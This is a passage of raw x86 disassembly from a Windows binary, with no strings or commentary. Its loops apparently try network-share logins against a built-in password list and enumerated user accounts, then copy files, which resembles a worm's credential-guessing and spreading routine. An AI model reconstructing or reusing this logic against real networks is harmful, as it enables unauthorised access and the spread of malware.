  401cf9:	68 00 00 00 08       	push   $0x8000000
  401cfe:	53                   	push   %ebx
  401cff:	53                   	push   %ebx
  401d00:	8d 94 24 8c 00 00 00 	lea    0x8c(%esp),%edx
  401d07:	53                   	push   %ebx
  401d08:	52                   	push   %edx
  401d09:	53                   	push   %ebx
  401d0a:	89 5c 24 58          	mov    %ebx,0x58(%esp)
  401d0e:	89 5c 24 60          	mov    %ebx,0x60(%esp)
  401d12:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  401d16:	89 5c 24 70          	mov    %ebx,0x70(%esp)
  401d1a:	89 5c 24 6c          	mov    %ebx,0x6c(%esp)
  401d1e:	89 5c 24 68          	mov    %ebx,0x68(%esp)
  401d22:	89 5c 24 64          	mov    %ebx,0x64(%esp)
  401d26:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%esp)
  401d2d:	00 
  401d2e:	89 9c 24 88 00 00 00 	mov    %ebx,0x88(%esp)
  401d35:	66 89 9c 24 86 00 00 	mov    %bx,0x86(%esp)
  401d3c:	00 
  401d3d:	c7 84 24 80 00 00 00 	movl   $0x81,0x80(%esp)
  401d44:	81 00 00 00 
  401d48:	ff d5                	call   *%ebp
  401d4a:	85 c0                	test   %eax,%eax
  401d4c:	74 0b                	je     0x401d59
  401d4e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401d52:	50                   	push   %eax
  401d53:	ff 15 7c 70 40 00    	call   *0x40707c
  401d59:	bf a0 84 40 00       	mov    $0x4084a0,%edi
  401d5e:	83 c9 ff             	or     $0xffffffff,%ecx
  401d61:	33 c0                	xor    %eax,%eax
  401d63:	8d 54 24 70          	lea    0x70(%esp),%edx
  401d67:	f2 ae                	repnz scas %es:(%edi),%al
  401d69:	f7 d1                	not    %ecx
  401d6b:	2b f9                	sub    %ecx,%edi
  401d6d:	8b c1                	mov    %ecx,%eax
  401d6f:	8b f7                	mov    %edi,%esi
  401d71:	8b fa                	mov    %edx,%edi
  401d73:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  401d77:	c1 e9 02             	shr    $0x2,%ecx
  401d7a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401d7c:	8b c8                	mov    %eax,%ecx
  401d7e:	8d 44 24 70          	lea    0x70(%esp),%eax
  401d82:	83 e1 03             	and    $0x3,%ecx
  401d85:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401d87:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401d8b:	51                   	push   %ecx
  401d8c:	52                   	push   %edx
  401d8d:	53                   	push   %ebx
  401d8e:	53                   	push   %ebx
  401d8f:	68 00 00 00 08       	push   $0x8000000
  401d94:	53                   	push   %ebx
  401d95:	53                   	push   %ebx
  401d96:	53                   	push   %ebx
  401d97:	50                   	push   %eax
  401d98:	53                   	push   %ebx
  401d99:	ff d5                	call   *%ebp
  401d9b:	85 c0                	test   %eax,%eax
  401d9d:	74 0b                	je     0x401daa
  401d9f:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401da3:	51                   	push   %ecx
  401da4:	ff 15 7c 70 40 00    	call   *0x40707c
  401daa:	bf 80 84 40 00       	mov    $0x408480,%edi
  401daf:	83 c9 ff             	or     $0xffffffff,%ecx
  401db2:	33 c0                	xor    %eax,%eax
  401db4:	8d 54 24 70          	lea    0x70(%esp),%edx
  401db8:	f2 ae                	repnz scas %es:(%edi),%al
  401dba:	f7 d1                	not    %ecx
  401dbc:	2b f9                	sub    %ecx,%edi
  401dbe:	8b c1                	mov    %ecx,%eax
  401dc0:	8b f7                	mov    %edi,%esi
  401dc2:	8b fa                	mov    %edx,%edi
  401dc4:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  401dc8:	c1 e9 02             	shr    $0x2,%ecx
  401dcb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401dcd:	8b c8                	mov    %eax,%ecx
  401dcf:	8d 44 24 70          	lea    0x70(%esp),%eax
  401dd3:	83 e1 03             	and    $0x3,%ecx
  401dd6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401dd8:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401ddc:	51                   	push   %ecx
  401ddd:	52                   	push   %edx
  401dde:	53                   	push   %ebx
  401ddf:	53                   	push   %ebx
  401de0:	68 00 00 00 08       	push   $0x8000000
  401de5:	53                   	push   %ebx
  401de6:	53                   	push   %ebx
  401de7:	53                   	push   %ebx
  401de8:	50                   	push   %eax
  401de9:	53                   	push   %ebx
  401dea:	ff d5                	call   *%ebp
  401dec:	85 c0                	test   %eax,%eax
  401dee:	74 0b                	je     0x401dfb
  401df0:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401df4:	51                   	push   %ecx
  401df5:	ff 15 7c 70 40 00    	call   *0x40707c
  401dfb:	5f                   	pop    %edi
  401dfc:	5e                   	pop    %esi
  401dfd:	5d                   	pop    %ebp
  401dfe:	5b                   	pop    %ebx
  401dff:	81 c4 64 01 00 00    	add    $0x164,%esp
  401e05:	c3                   	ret
  401e06:	90                   	nop
  401e07:	90                   	nop
  401e08:	90                   	nop
  401e09:	90                   	nop
  401e0a:	90                   	nop
  401e0b:	90                   	nop
  401e0c:	90                   	nop
  401e0d:	90                   	nop
  401e0e:	90                   	nop
  401e0f:	90                   	nop
  401e10:	81 ec 5c 06 00 00    	sub    $0x65c,%esp
  401e16:	53                   	push   %ebx
  401e17:	55                   	push   %ebp
  401e18:	8b 2d 38 71 40 00    	mov    0x407138,%ebp
  401e1e:	56                   	push   %esi
  401e1f:	8b b4 24 74 06 00 00 	mov    0x674(%esp),%esi
  401e26:	57                   	push   %edi
  401e27:	56                   	push   %esi
  401e28:	8d 44 24 34          	lea    0x34(%esp),%eax
  401e2c:	68 94 85 40 00       	push   $0x408594
  401e31:	50                   	push   %eax
  401e32:	ff d5                	call   *%ebp
  401e34:	8b 9c 24 80 06 00 00 	mov    0x680(%esp),%ebx
  401e3b:	b9 08 00 00 00       	mov    $0x8,%ecx
  401e40:	33 c0                	xor    %eax,%eax
  401e42:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  401e46:	83 c4 0c             	add    $0xc,%esp
  401e49:	8d 54 24 10          	lea    0x10(%esp),%edx
  401e4d:	f3 ab                	rep stos %eax,%es:(%edi)
  401e4f:	8b bc 24 70 06 00 00 	mov    0x670(%esp),%edi
  401e56:	50                   	push   %eax
  401e57:	57                   	push   %edi
  401e58:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401e5c:	53                   	push   %ebx
  401e5d:	52                   	push   %edx
  401e5e:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  401e62:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  401e69:	00 
  401e6a:	89 44 24 30          	mov    %eax,0x30(%esp)
  401e6e:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401e72:	ff 15 34 92 40 00    	call   *0x409234
  401e78:	83 f8 55             	cmp    $0x55,%eax
  401e7b:	0f 84 8b 01 00 00    	je     0x40200c
  401e81:	3d b2 04 00 00       	cmp    $0x4b2,%eax
  401e86:	0f 84 80 01 00 00    	je     0x40200c
  401e8c:	85 c0                	test   %eax,%eax
  401e8e:	0f 85 78 01 00 00    	jne    0x40200c
  401e94:	6a 02                	push   $0x2
  401e96:	50                   	push   %eax
  401e97:	56                   	push   %esi
  401e98:	ff 15 18 70 40 00    	call   *0x407018
  401e9e:	85 c0                	test   %eax,%eax
  401ea0:	0f 85 87 00 00 00    	jne    0x401f2d
  401ea6:	33 ed                	xor    %ebp,%ebp
  401ea8:	be 84 83 40 00       	mov    $0x408384,%esi
  401ead:	8b c7                	mov    %edi,%eax
  401eaf:	8a 10                	mov    (%eax),%dl
  401eb1:	8a ca                	mov    %dl,%cl
  401eb3:	3a 16                	cmp    (%esi),%dl
  401eb5:	75 1c                	jne    0x401ed3
  401eb7:	84 c9                	test   %cl,%cl
  401eb9:	74 14                	je     0x401ecf
  401ebb:	8a 50 01             	mov    0x1(%eax),%dl
  401ebe:	8a ca                	mov    %dl,%cl
  401ec0:	3a 56 01             	cmp    0x1(%esi),%dl
  401ec3:	75 0e                	jne    0x401ed3
  401ec5:	83 c0 02             	add    $0x2,%eax
  401ec8:	83 c6 02             	add    $0x2,%esi
  401ecb:	84 c9                	test   %cl,%cl
  401ecd:	75 e0                	jne    0x401eaf
  401ecf:	33 c0                	xor    %eax,%eax
  401ed1:	eb 05                	jmp    0x401ed8
  401ed3:	1b c0                	sbb    %eax,%eax
  401ed5:	83 d8 ff             	sbb    $0xffffffff,%eax
  401ed8:	85 c0                	test   %eax,%eax
  401eda:	75 3d                	jne    0x401f19
  401edc:	be 84 83 40 00       	mov    $0x408384,%esi
  401ee1:	8b c3                	mov    %ebx,%eax
  401ee3:	8a 10                	mov    (%eax),%dl
  401ee5:	8a 1e                	mov    (%esi),%bl
  401ee7:	8a ca                	mov    %dl,%cl
  401ee9:	3a d3                	cmp    %bl,%dl
  401eeb:	75 1e                	jne    0x401f0b
  401eed:	84 c9                	test   %cl,%cl
  401eef:	74 16                	je     0x401f07
  401ef1:	8a 50 01             	mov    0x1(%eax),%dl
  401ef4:	8a 5e 01             	mov    0x1(%esi),%bl
  401ef7:	8a ca                	mov    %dl,%cl
  401ef9:	3a d3                	cmp    %bl,%dl
  401efb:	75 0e                	jne    0x401f0b
  401efd:	83 c0 02             	add    $0x2,%eax
  401f00:	83 c6 02             	add    $0x2,%esi
  401f03:	84 c9                	test   %cl,%cl
  401f05:	75 dc                	jne    0x401ee3
  401f07:	33 c0                	xor    %eax,%eax
  401f09:	eb 05                	jmp    0x401f10
  401f0b:	1b c0                	sbb    %eax,%eax
  401f0d:	83 d8 ff             	sbb    $0xffffffff,%eax
  401f10:	85 c0                	test   %eax,%eax
  401f12:	75 05                	jne    0x401f19
  401f14:	bd 01 00 00 00       	mov    $0x1,%ebp
  401f19:	6a 01                	push   $0x1
  401f1b:	8d 44 24 34          	lea    0x34(%esp),%eax
  401f1f:	6a 00                	push   $0x0
  401f21:	50                   	push   %eax
  401f22:	ff 15 20 8c 40 00    	call   *0x408c20
  401f28:	e9 e1 00 00 00       	jmp    0x40200e
  401f2d:	50                   	push   %eax
  401f2e:	ff 15 20 70 40 00    	call   *0x407020
  401f34:	53                   	push   %ebx
  401f35:	8d 4e 02             	lea    0x2(%esi),%ecx
  401f38:	57                   	push   %edi
  401f39:	51                   	push   %ecx
  401f3a:	8d 94 24 78 02 00 00 	lea    0x278(%esp),%edx
  401f41:	68 80 85 40 00       	push   $0x408580
  401f46:	52                   	push   %edx
  401f47:	ff d5                	call   *%ebp
  401f49:	8d 84 24 80 02 00 00 	lea    0x280(%esp),%eax
  401f50:	68 1c 82 40 00       	push   $0x40821c
  401f55:	50                   	push   %eax
  401f56:	e8 d5 f4 ff ff       	call   0x401430
  401f5b:	68 60 85 40 00       	push   $0x408560
  401f60:	68 40 85 40 00       	push   $0x408540
  401f65:	68 38 85 40 00       	push   $0x408538
  401f6a:	56                   	push   %esi
  401f6b:	e8 80 fa ff ff       	call   0x4019f0
  401f70:	8b 3d 44 70 40 00    	mov    0x407044,%edi
  401f76:	83 c4 2c             	add    $0x2c,%esp
  401f79:	85 c0                	test   %eax,%eax
  401f7b:	74 23                	je     0x401fa0
  401f7d:	68 38 85 40 00       	push   $0x408538
  401f82:	56                   	push   %esi
  401f83:	e8 e8 fa ff ff       	call   0x401a70
  401f88:	83 c4 08             	add    $0x8,%esp
  401f8b:	68 e8 03 00 00       	push   $0x3e8
  401f90:	ff d7                	call   *%edi
  401f92:	68 38 85 40 00       	push   $0x408538
  401f97:	56                   	push   %esi
  401f98:	e8 33 fb ff ff       	call   0x401ad0
  401f9d:	83 c4 08             	add    $0x8,%esp
  401fa0:	56                   	push   %esi
  401fa1:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  401fa5:	68 24 85 40 00       	push   $0x408524
  401faa:	51                   	push   %ecx
  401fab:	ff d5                	call   *%ebp
  401fad:	83 c4 0c             	add    $0xc,%esp
  401fb0:	8d 54 24 64          	lea    0x64(%esp),%edx
  401fb4:	6a 00                	push   $0x0
  401fb6:	52                   	push   %edx
  401fb7:	68 28 8c 40 00       	push   $0x408c28
  401fbc:	ff 15 40 70 40 00    	call   *0x407040
  401fc2:	85 c0                	test   %eax,%eax
  401fc4:	74 3f                	je     0x402005
  401fc6:	68 0c 85 40 00       	push   $0x40850c
  401fcb:	68 e8 84 40 00       	push   $0x4084e8
  401fd0:	68 e0 84 40 00       	push   $0x4084e0
  401fd5:	56                   	push   %esi
  401fd6:	e8 15 fa ff ff       	call   0x4019f0
  401fdb:	83 c4 10             	add    $0x10,%esp
  401fde:	85 c0                	test   %eax,%eax
  401fe0:	74 23                	je     0x402005
  401fe2:	68 e0 84 40 00       	push   $0x4084e0
  401fe7:	56                   	push   %esi
  401fe8:	e8 83 fa ff ff       	call   0x401a70
  401fed:	83 c4 08             	add    $0x8,%esp
  401ff0:	68 e8 03 00 00       	push   $0x3e8
  401ff5:	ff d7                	call   *%edi
  401ff7:	68 e0 84 40 00       	push   $0x4084e0
  401ffc:	56                   	push   %esi
  401ffd:	e8 ce fa ff ff       	call   0x401ad0
  402002:	83 c4 08             	add    $0x8,%esp
  402005:	bd 01 00 00 00       	mov    $0x1,%ebp
  40200a:	eb 02                	jmp    0x40200e
  40200c:	33 ed                	xor    %ebp,%ebp
  40200e:	6a 01                	push   $0x1
  402010:	8d 44 24 34          	lea    0x34(%esp),%eax
  402014:	6a 00                	push   $0x0
  402016:	50                   	push   %eax
  402017:	ff 15 20 8c 40 00    	call   *0x408c20
  40201d:	5f                   	pop    %edi
  40201e:	8b c5                	mov    %ebp,%eax
  402020:	5e                   	pop    %esi
  402021:	5d                   	pop    %ebp
  402022:	5b                   	pop    %ebx
  402023:	81 c4 5c 06 00 00    	add    $0x65c,%esp
  402029:	c3                   	ret
  40202a:	90                   	nop
  40202b:	90                   	nop
  40202c:	90                   	nop
  40202d:	90                   	nop
  40202e:	90                   	nop
  40202f:	90                   	nop
  402030:	81 ec 04 01 00 00    	sub    $0x104,%esp
  402036:	b8 3c 80 40 00       	mov    $0x40803c,%eax
  40203b:	85 c0                	test   %eax,%eax
  40203d:	53                   	push   %ebx
  40203e:	55                   	push   %ebp
  40203f:	56                   	push   %esi
  402040:	57                   	push   %edi
  402041:	75 0b                	jne    0x40204e
  402043:	5f                   	pop    %edi
  402044:	5e                   	pop    %esi
  402045:	5d                   	pop    %ebp
  402046:	5b                   	pop    %ebx
  402047:	81 c4 04 01 00 00    	add    $0x104,%esp
  40204d:	c3                   	ret
  40204e:	8b bc 24 20 01 00 00 	mov    0x120(%esp),%edi
  402055:	8b 9c 24 1c 01 00 00 	mov    0x11c(%esp),%ebx
  40205c:	8b b4 24 18 01 00 00 	mov    0x118(%esp),%esi
  402063:	57                   	push   %edi
  402064:	53                   	push   %ebx
  402065:	56                   	push   %esi
  402066:	56                   	push   %esi
  402067:	e8 a4 fd ff ff       	call   0x401e10
  40206c:	83 c4 10             	add    $0x10,%esp
  40206f:	83 f8 01             	cmp    $0x1,%eax
  402072:	75 10                	jne    0x402084
  402074:	5f                   	pop    %edi
  402075:	5e                   	pop    %esi
  402076:	5d                   	pop    %ebp
  402077:	b8 01 00 00 00       	mov    $0x1,%eax
  40207c:	5b                   	pop    %ebx
  40207d:	81 c4 04 01 00 00    	add    $0x104,%esp
  402083:	c3                   	ret
  402084:	a1 3c 80 40 00       	mov    0x40803c,%eax
  402089:	bd 3c 80 40 00       	mov    $0x40803c,%ebp
  40208e:	85 c0                	test   %eax,%eax
  402090:	74 1e                	je     0x4020b0
  402092:	8b 4d 00             	mov    0x0(%ebp),%ecx
  402095:	57                   	push   %edi
  402096:	53                   	push   %ebx
  402097:	51                   	push   %ecx
  402098:	56                   	push   %esi
  402099:	e8 72 fd ff ff       	call   0x401e10
  40209e:	83 c4 10             	add    $0x10,%esp
  4020a1:	83 f8 01             	cmp    $0x1,%eax
  4020a4:	74 ce                	je     0x402074
  4020a6:	8b 45 04             	mov    0x4(%ebp),%eax
  4020a9:	83 c5 04             	add    $0x4,%ebp
  4020ac:	85 c0                	test   %eax,%eax
  4020ae:	75 e2                	jne    0x402092
  4020b0:	8b 2d 38 71 40 00    	mov    0x407138,%ebp
  4020b6:	56                   	push   %esi
  4020b7:	8d 54 24 14          	lea    0x14(%esp),%edx
  4020bb:	68 cb 9a 40 00       	push   $0x409acb
  4020c0:	52                   	push   %edx
  4020c1:	ff d5                	call   *%ebp
  4020c3:	57                   	push   %edi
  4020c4:	8d 44 24 20          	lea    0x20(%esp),%eax
  4020c8:	53                   	push   %ebx
  4020c9:	50                   	push   %eax
  4020ca:	56                   	push   %esi
  4020cb:	e8 40 fd ff ff       	call   0x401e10
  4020d0:	83 c4 1c             	add    $0x1c,%esp
  4020d3:	83 f8 01             	cmp    $0x1,%eax
  4020d6:	75 0b                	jne    0x4020e3
  4020d8:	5f                   	pop    %edi
  4020d9:	5e                   	pop    %esi
  4020da:	5d                   	pop    %ebp
  4020db:	5b                   	pop    %ebx
  4020dc:	81 c4 04 01 00 00    	add    $0x104,%esp
  4020e2:	c3                   	ret
  4020e3:	56                   	push   %esi
  4020e4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4020e8:	68 cc 85 40 00       	push   $0x4085cc
  4020ed:	51                   	push   %ecx
  4020ee:	ff d5                	call   *%ebp
  4020f0:	57                   	push   %edi
  4020f1:	8d 54 24 20          	lea    0x20(%esp),%edx
  4020f5:	53                   	push   %ebx
  4020f6:	52                   	push   %edx
  4020f7:	56                   	push   %esi
  4020f8:	e8 13 fd ff ff       	call   0x401e10
  4020fd:	83 c4 1c             	add    $0x1c,%esp
  402100:	83 f8 01             	cmp    $0x1,%eax
  402103:	75 0b                	jne    0x402110
  402105:	5f                   	pop    %edi
  402106:	5e                   	pop    %esi
  402107:	5d                   	pop    %ebp
  402108:	5b                   	pop    %ebx
  402109:	81 c4 04 01 00 00    	add    $0x104,%esp
  40210f:	c3                   	ret
  402110:	56                   	push   %esi
  402111:	8d 44 24 14          	lea    0x14(%esp),%eax
  402115:	68 c4 85 40 00       	push   $0x4085c4
  40211a:	50                   	push   %eax
  40211b:	ff d5                	call   *%ebp
  40211d:	57                   	push   %edi
  40211e:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402122:	53                   	push   %ebx
  402123:	51                   	push   %ecx
  402124:	56                   	push   %esi
  402125:	e8 e6 fc ff ff       	call   0x401e10
  40212a:	83 c4 1c             	add    $0x1c,%esp
  40212d:	83 f8 01             	cmp    $0x1,%eax
  402130:	75 0b                	jne    0x40213d
  402132:	5f                   	pop    %edi
  402133:	5e                   	pop    %esi
  402134:	5d                   	pop    %ebp
  402135:	5b                   	pop    %ebx
  402136:	81 c4 04 01 00 00    	add    $0x104,%esp
  40213c:	c3                   	ret
  40213d:	56                   	push   %esi
  40213e:	8d 54 24 14          	lea    0x14(%esp),%edx
  402142:	68 bc 85 40 00       	push   $0x4085bc
  402147:	52                   	push   %edx
  402148:	ff d5                	call   *%ebp
  40214a:	57                   	push   %edi
  40214b:	8d 44 24 20          	lea    0x20(%esp),%eax
  40214f:	53                   	push   %ebx
  402150:	50                   	push   %eax
  402151:	56                   	push   %esi
  402152:	e8 b9 fc ff ff       	call   0x401e10
  402157:	83 c4 1c             	add    $0x1c,%esp
  40215a:	83 f8 01             	cmp    $0x1,%eax
  40215d:	75 0b                	jne    0x40216a
  40215f:	5f                   	pop    %edi
  402160:	5e                   	pop    %esi
  402161:	5d                   	pop    %ebp
  402162:	5b                   	pop    %ebx
  402163:	81 c4 04 01 00 00    	add    $0x104,%esp
  402169:	c3                   	ret
  40216a:	56                   	push   %esi
  40216b:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40216f:	68 b8 85 40 00       	push   $0x4085b8
  402174:	51                   	push   %ecx
  402175:	ff d5                	call   *%ebp
  402177:	57                   	push   %edi
  402178:	8d 54 24 20          	lea    0x20(%esp),%edx
  40217c:	53                   	push   %ebx
  40217d:	52                   	push   %edx
  40217e:	56                   	push   %esi
  40217f:	e8 8c fc ff ff       	call   0x401e10
  402184:	83 c4 1c             	add    $0x1c,%esp
  402187:	83 f8 01             	cmp    $0x1,%eax
  40218a:	75 0b                	jne    0x402197
  40218c:	5f                   	pop    %edi
  40218d:	5e                   	pop    %esi
  40218e:	5d                   	pop    %ebp
  40218f:	5b                   	pop    %ebx
  402190:	81 c4 04 01 00 00    	add    $0x104,%esp
  402196:	c3                   	ret
  402197:	56                   	push   %esi
  402198:	8d 44 24 14          	lea    0x14(%esp),%eax
  40219c:	68 b0 85 40 00       	push   $0x4085b0
  4021a1:	50                   	push   %eax
  4021a2:	ff d5                	call   *%ebp
  4021a4:	57                   	push   %edi
  4021a5:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4021a9:	53                   	push   %ebx
  4021aa:	51                   	push   %ecx
  4021ab:	56                   	push   %esi
  4021ac:	e8 5f fc ff ff       	call   0x401e10
  4021b1:	83 c4 1c             	add    $0x1c,%esp
  4021b4:	83 f8 01             	cmp    $0x1,%eax
  4021b7:	75 0b                	jne    0x4021c4
  4021b9:	5f                   	pop    %edi
  4021ba:	5e                   	pop    %esi
  4021bb:	5d                   	pop    %ebp
  4021bc:	5b                   	pop    %ebx
  4021bd:	81 c4 04 01 00 00    	add    $0x104,%esp
  4021c3:	c3                   	ret
  4021c4:	56                   	push   %esi
  4021c5:	8d 54 24 14          	lea    0x14(%esp),%edx
  4021c9:	68 a8 85 40 00       	push   $0x4085a8
  4021ce:	52                   	push   %edx
  4021cf:	ff d5                	call   *%ebp
  4021d1:	57                   	push   %edi
  4021d2:	8d 44 24 20          	lea    0x20(%esp),%eax
  4021d6:	53                   	push   %ebx
  4021d7:	50                   	push   %eax
  4021d8:	56                   	push   %esi
  4021d9:	e8 32 fc ff ff       	call   0x401e10
  4021de:	83 c4 1c             	add    $0x1c,%esp
  4021e1:	83 f8 01             	cmp    $0x1,%eax
  4021e4:	75 0b                	jne    0x4021f1
  4021e6:	5f                   	pop    %edi
  4021e7:	5e                   	pop    %esi
  4021e8:	5d                   	pop    %ebp
  4021e9:	5b                   	pop    %ebx
  4021ea:	81 c4 04 01 00 00    	add    $0x104,%esp
  4021f0:	c3                   	ret
  4021f1:	56                   	push   %esi
  4021f2:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4021f6:	68 a4 85 40 00       	push   $0x4085a4
  4021fb:	51                   	push   %ecx
  4021fc:	ff d5                	call   *%ebp
  4021fe:	57                   	push   %edi
  4021ff:	8d 54 24 20          	lea    0x20(%esp),%edx
  402203:	53                   	push   %ebx
  402204:	52                   	push   %edx
  402205:	56                   	push   %esi
  402206:	e8 05 fc ff ff       	call   0x401e10
  40220b:	83 c4 1c             	add    $0x1c,%esp
  40220e:	83 f8 01             	cmp    $0x1,%eax
  402211:	75 0b                	jne    0x40221e
  402213:	5f                   	pop    %edi
  402214:	5e                   	pop    %esi
  402215:	5d                   	pop    %ebp
  402216:	5b                   	pop    %ebx
  402217:	81 c4 04 01 00 00    	add    $0x104,%esp
  40221d:	c3                   	ret
  40221e:	56                   	push   %esi
  40221f:	8d 44 24 14          	lea    0x14(%esp),%eax
  402223:	68 9c 85 40 00       	push   $0x40859c
  402228:	50                   	push   %eax
  402229:	ff d5                	call   *%ebp
  40222b:	57                   	push   %edi
  40222c:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402230:	53                   	push   %ebx
  402231:	51                   	push   %ecx
  402232:	56                   	push   %esi
  402233:	e8 d8 fb ff ff       	call   0x401e10
  402238:	83 c4 1c             	add    $0x1c,%esp
  40223b:	48                   	dec    %eax
  40223c:	f7 d8                	neg    %eax
  40223e:	5f                   	pop    %edi
  40223f:	5e                   	pop    %esi
  402240:	1b c0                	sbb    %eax,%eax
  402242:	5d                   	pop    %ebp
  402243:	40                   	inc    %eax
  402244:	5b                   	pop    %ebx
  402245:	81 c4 04 01 00 00    	add    $0x104,%esp
  40224b:	c3                   	ret
  40224c:	90                   	nop
  40224d:	90                   	nop
  40224e:	90                   	nop
  40224f:	90                   	nop
  402250:	81 ec e4 05 00 00    	sub    $0x5e4,%esp
  402256:	55                   	push   %ebp
  402257:	8b ac 24 ec 05 00 00 	mov    0x5ec(%esp),%ebp
  40225e:	57                   	push   %edi
  40225f:	8d 84 24 04 02 00 00 	lea    0x204(%esp),%eax
  402266:	68 e8 03 00 00       	push   $0x3e8
  40226b:	50                   	push   %eax
  40226c:	33 ff                	xor    %edi,%edi
  40226e:	6a ff                	push   $0xffffffff
  402270:	55                   	push   %ebp
  402271:	57                   	push   %edi
  402272:	57                   	push   %edi
  402273:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402277:	89 7c 24 24          	mov    %edi,0x24(%esp)
  40227b:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  40227f:	89 7c 24 30          	mov    %edi,0x30(%esp)
  402283:	ff 15 4c 70 40 00    	call   *0x40704c
  402289:	55                   	push   %ebp
  40228a:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  40228e:	68 94 85 40 00       	push   $0x408594
  402293:	51                   	push   %ecx
  402294:	ff 15 38 71 40 00    	call   *0x407138
  40229a:	83 c4 0c             	add    $0xc,%esp
  40229d:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4022a1:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  4022a5:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  4022a9:	57                   	push   %edi
  4022aa:	68 4c 96 40 00       	push   $0x40964c
  4022af:	68 4c 96 40 00       	push   $0x40964c
  4022b4:	50                   	push   %eax
  4022b5:	89 7c 24 48          	mov    %edi,0x48(%esp)
  4022b9:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4022bd:	89 54 24 40          	mov    %edx,0x40(%esp)
  4022c1:	ff 15 34 92 40 00    	call   *0x409234
  4022c7:	85 c0                	test   %eax,%eax
  4022c9:	74 17                	je     0x4022e2
  4022cb:	6a 01                	push   $0x1
  4022cd:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  4022d1:	57                   	push   %edi
  4022d2:	51                   	push   %ecx
  4022d3:	ff 15 20 8c 40 00    	call   *0x408c20
  4022d9:	5f                   	pop    %edi
  4022da:	5d                   	pop    %ebp
  4022db:	81 c4 e4 05 00 00    	add    $0x5e4,%esp
  4022e1:	c3                   	ret
  4022e2:	53                   	push   %ebx
  4022e3:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4022e7:	56                   	push   %esi
  4022e8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4022ec:	52                   	push   %edx
  4022ed:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4022f1:	50                   	push   %eax
  4022f2:	51                   	push   %ecx
  4022f3:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4022f7:	6a ff                	push   $0xffffffff
  4022f9:	52                   	push   %edx
  4022fa:	6a 02                	push   $0x2
  4022fc:	8d 84 24 24 02 00 00 	lea    0x224(%esp),%eax
  402303:	57                   	push   %edi
  402304:	50                   	push   %eax
  402305:	ff 15 38 96 40 00    	call   *0x409638
  40230b:	6a 01                	push   $0x1
  40230d:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402311:	57                   	push   %edi
  402312:	51                   	push   %ecx
  402313:	8b d8                	mov    %eax,%ebx
  402315:	ff 15 20 8c 40 00    	call   *0x408c20
  40231b:	8b 74 24 10          	mov    0x10(%esp),%esi
  40231f:	3b df                	cmp    %edi,%ebx
  402321:	0f 84 8c 00 00 00    	je     0x4023b3
  402327:	81 fb ea 00 00 00    	cmp    $0xea,%ebx
  40232d:	0f 84 80 00 00 00    	je     0x4023b3
  402333:	3b f7                	cmp    %edi,%esi
  402335:	74 0b                	je     0x402342
  402337:	56                   	push   %esi
  402338:	ff 15 24 8c 40 00    	call   *0x408c24
  40233e:	89 7c 24 10          	mov    %edi,0x10(%esp)
  402342:	a1 30 80 40 00       	mov    0x408030,%eax
  402347:	bb 30 80 40 00       	mov    $0x408030,%ebx
  40234c:	3b c7                	cmp    %edi,%eax
  40234e:	74 49                	je     0x402399
  402350:	8b 3b                	mov    (%ebx),%edi
  402352:	83 c9 ff             	or     $0xffffffff,%ecx
  402355:	33 c0                	xor    %eax,%eax
  402357:	8d 94 24 0c 01 00 00 	lea    0x10c(%esp),%edx
  40235e:	f2 ae                	repnz scas %es:(%edi),%al
  402360:	f7 d1                	not    %ecx
  402362:	2b f9                	sub    %ecx,%edi
  402364:	6a 00                	push   $0x0
  402366:	8b c1                	mov    %ecx,%eax
  402368:	8b f7                	mov    %edi,%esi
  40236a:	8b fa                	mov    %edx,%edi
  40236c:	55                   	push   %ebp
  40236d:	c1 e9 02             	shr    $0x2,%ecx
  402370:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402372:	8b c8                	mov    %eax,%ecx
  402374:	83 e1 03             	and    $0x3,%ecx
  402377:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402379:	8d 8c 24 14 01 00 00 	lea    0x114(%esp),%ecx
  402380:	51                   	push   %ecx
  402381:	e8 aa fc ff ff       	call   0x402030
  402386:	83 c4 0c             	add    $0xc,%esp
  402389:	85 c0                	test   %eax,%eax
  40238b:	75 0a                	jne    0x402397
  40238d:	8b 43 04             	mov    0x4(%ebx),%eax
  402390:	83 c3 04             	add    $0x4,%ebx
  402393:	85 c0                	test   %eax,%eax
  402395:	75 b9                	jne    0x402350
  402397:	33 ff                	xor    %edi,%edi
  402399:	8b 44 24 10          	mov    0x10(%esp),%eax
  40239d:	5e                   	pop    %esi
  40239e:	3b c7                	cmp    %edi,%eax
  4023a0:	5b                   	pop    %ebx
